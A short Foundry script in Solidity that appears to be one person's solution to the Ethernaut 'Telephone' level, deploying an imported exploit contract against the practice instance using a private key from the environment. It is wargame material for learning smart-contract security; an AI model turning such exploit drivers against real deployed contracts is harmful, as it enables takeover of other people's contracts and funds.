// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Telephone} from "src/04/Telephone.sol";
import {TelephoneExploit} from "src/04/TelephoneExploit.sol";

contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL4");
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Telephone level = Telephone(instance); 
    TelephoneExploit public exploit;
        
    function run() external {
        vm.startBroadcast(hacker);

        exploit = new TelephoneExploit();
        exploit.run(level);
        
        vm.stopBroadcast();
    }
}